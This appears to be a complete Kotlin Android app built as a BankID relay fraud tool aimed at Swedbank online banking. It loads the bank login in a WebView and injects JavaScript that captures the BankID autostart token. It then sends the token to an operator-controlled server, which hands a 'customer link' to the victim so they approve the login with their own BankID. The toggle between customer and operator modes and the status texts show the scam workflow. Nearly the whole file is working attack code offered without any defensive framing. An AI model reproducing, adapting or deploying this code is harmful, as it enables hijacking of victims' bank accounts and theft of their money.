package com.relay

import android.app.Activity
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Color
import android.net.Uri
import android.os.Bundle
import android.view.ViewGroup
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import java.io.BufferedReader
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : Activity() {

    private lateinit var web: WebView
    private lateinit var bar: TextView
    private lateinit var serverField: EditText
    private lateinit var bankField: EditText
    private lateinit var modeBtn: Button
    private lateinit var inBtn: Button
    private lateinit var p: SharedPreferences

    private var baseUrl = ""
    private var bankUrl = ""
    private var last = ""
    private var kund = true

    private val inst = "(function(){if(window.__rh){return}window.__rh=1;" +
        "var W=window.open;window.open=function(u){try{if(u&&String(u).indexOf('autostarttoken')>=0){location.href=u;return window}}catch(e){}return W.apply(window,arguments)};" +
        "setInterval(function(){try{var a=document.querySelector('a[href*=autostarttoken]');" +
        "if(a&&a.href){var m=/[?&]autostarttoken=([0-9a-fA-F-]{36})/.exec(a.href);if(m)Relay.tok(m[1])}}catch(e){}},700)})()"

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        p = getSharedPreferences("relay", 0)
        baseUrl = p.getString("base", "") ?: ""
        bankUrl = p.getString("bank", "https://online.swedbank.se/") ?: "https://online.swedbank.se/"
        kund = p.getBoolean("kund", true)
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        ui()
    }

    private fun ui() {
        val root = LinearLayout(this)
        root.orientation = LinearLayout.VERTICAL

        val rad1 = LinearLayout(this)
        rad1.orientation = LinearLayout.HORIZONTAL

        serverField = EditText(this)
        serverField.hint = "server-url"
        serverField.setText(baseUrl)
        rad1.addView(serverField, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 3f))

        val run = Button(this)
        run.text = "KOR"
        run.setOnClickListener {
            baseUrl = serverField.text.toString().trim().trimEnd('/')
            p.edit().putString("base", baseUrl).apply()
            last = ""
            if ((p.getString("code", "") ?: "").isEmpty()) newSession()
            bar.text = "laddar banksidan"
            web.loadUrl(bankUrl)
        }
        rad1.addView(run, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
        root.addView(rad1)

        val rad2 = LinearLayout(this)
        rad2.orientation = LinearLayout.HORIZONTAL

        bankField = EditText(this)
        bankField.hint = "bank-url"
        bankField.setText(bankUrl)
        bankField.setOnFocusChangeListener { _, harFokus ->
            if (!harFokus) {
                bankUrl = bankField.text.toString().trim()
                p.edit().putString("bank", bankUrl).apply()
            }
        }
        rad2.addView(bankField, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 3f))

        modeBtn = Button(this)
        modeBtn.text = if (kund) "KUND" else "OP"
        modeBtn.setOnClickListener {
            kund = !kund
            modeBtn.text = if (kund) "KUND" else "OP"
            p.edit().putBoolean("kund", kund).apply()
        }
        rad2.addView(modeBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

        inBtn = Button(this)
        inBtn.text = "IN"
        inBtn.setOnClickListener { taIn() }
        rad2.addView(inBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

        val ny = Button(this)
        ny.text = "KOD"
        ny.setOnClickListener { newSession() }
        rad2.addView(ny, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
        root.addView(rad2)

        bar = TextView(this)
        bar.textSize = 11f
        bar.setBackgroundColor(Color.parseColor("#101010"))
        bar.setTextColor(Color.parseColor("#66ff88"))
        bar.setPadding(14, 8, 14, 8)
        bar.text = "redo"
        root.addView(bar)

        web = WebView(this)
        web.settings.javaScriptEnabled = true
        web.settings.domStorageEnabled = true
        web.settings.databaseEnabled = true
        try {
            web.settings.userAgentString = web.settings.userAgentString.replace("; wv", "")
        } catch (t: Throwable) {}

        web.webViewClient = object : WebViewClient() {

            override fun shouldOverrideUrlLoading(v: WebView, r: WebResourceRequest): Boolean {
                val s = r.url.toString()
                val t = tok(s)
                if (t != null) {
                    grab(t)
                    return true
                }
                if (s.startsWith("bankid:") || s.startsWith("intent:")) return true
                return false
            }

            override fun onPageFinished(v: WebView, url: String?) {
                try { web.evaluateJavascript(inst, null) } catch (t: Throwable) {}
            }

            override fun doUpdateVisitedHistory(v: WebView, url: String?, isReload: Boolean) {
                if (url == null) return
                var s = url.replace("https://", "").replace("http://", "")
                if (s.length > 62) s = s.substring(0, 62)
                bar.text = s
            }
        }

        web.addJavascriptInterface(Bridge(), "Relay")

        root.addView(web, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f))
        setContentView(root)
    }

    private inner class Bridge {
        @JavascriptInterface
        fun tok(t: String) {
            runOnUiThread { grab(t) }
        }
    }

    private fun tok(s: String): String? {
        val m = Regex("[?&]autostarttoken=([0-9a-fA-F-]{36})").find(s)
        if (m == null) return null
        return m.groupValues[1]
    }

    private fun grab(t: String) {
        if (t == last) return
        last = t
        val c = p.getString("code", "") ?: ""
        if (c.isEmpty()) { newSession(); return }
        post("/api/session/" + c + "/token", t)
        inBtn.setBackgroundColor(Color.parseColor("#22aa55"))
        inBtn.setTextColor(Color.WHITE)
        bar.text = "TOKEN SKICKAD - tryck IN nar kunden sagt klart"
        if (!kund) {
            try {
                startActivity(Intent(Intent.ACTION_VIEW,
                    Uri.parse("https://app.bankid.com/?autostarttoken=" + t + "&redirect=null")))
            } catch (x: Throwable) {}
        }
    }

    private fun taIn() {
        bankUrl = bankField.text.toString().trim()
        p.edit().putString("bank", bankUrl).apply()
        bar.text = "TAR IN - laddar banken"
        web.loadUrl(bankUrl)
    }

    private fun newSession() {
        if (baseUrl.isEmpty()) { bar.text = "skriv server-url forst"; return }
        var c = ""
        try {
            val con = URL(baseUrl + "/api/session").openConnection() as HttpURLConnection
            con.requestMethod = "POST"
            con.connectTimeout = 8000
            con.readTimeout = 8000
            val br = BufferedReader(con.inputStream.reader())
            var line = br.readLine()
            while (line != null) {
                val m = Regex("\"code\"\\s*:\\s*\"([A-Za-z0-9]+)\"").find(line)
                if (m != null) c = m.groupValues[1]
                line = br.readLine()
            }
            br.close()
            con.disconnect()
        } catch (t: Throwable) {
            bar.text = "kunde inte skapa session"
        }
        if (c.isNotEmpty()) {
            p.edit().putString("code", c).apply()
            last = ""
            bar.text = "KUNDLANK: " + baseUrl + "/k/" + c
        }
    }

    private fun post(path: String, body: String) {
        if (baseUrl.isEmpty()) return
        val b = baseUrl
        Thread {
            try {
                val con = URL(b + path).openConnection() as HttpURLConnection
                con.requestMethod = "POST"
                con.doOutput = true
                con.setRequestProperty("Content-Type", "text/plain")
                con.connectTimeout = 8000
                con.readTimeout = 8000
                con.outputStream.write(body.toByteArray())
                con.outputStream.flush()
                con.responseCode
                con.disconnect()
            } catch (t: Throwable) {}
        }.start()
    }

    override fun onBackPressed() {
        if (web.canGoBack()) web.goBack() else super.onBackPressed()
    }
}
